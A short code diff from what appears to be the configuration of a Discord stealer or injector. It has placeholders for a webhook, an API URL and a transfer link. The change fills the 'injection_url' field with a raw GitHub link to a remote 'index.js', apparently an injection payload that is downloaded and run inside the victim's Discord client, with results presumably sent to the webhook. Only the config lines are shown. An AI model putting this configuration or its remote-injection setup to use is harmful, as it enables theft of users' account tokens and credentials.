@@ -23,7 +23,7 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "",
+    "https://raw.githubusercontent.com/rodafaas7/dcinj31/main/index.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
